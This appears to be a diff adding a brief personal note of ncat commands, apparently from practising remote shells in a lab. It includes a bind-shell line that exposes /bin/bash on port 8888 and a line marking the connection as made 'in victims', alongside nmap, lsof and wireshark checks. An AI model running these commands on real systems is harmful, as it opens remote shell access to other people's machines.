@@ -1,0 +1,11 @@
+ncat --help
+ncat -v -l -p 8888 -e /bin/bash &
+lsof -i :8888
+nmap localhost
+ncat -l -p 8888
+ncat --ssl -l -p 8888
+
+
+ncat ip_address:8888-In victims
+wireshark
+ncat --ssl ip_address 8888
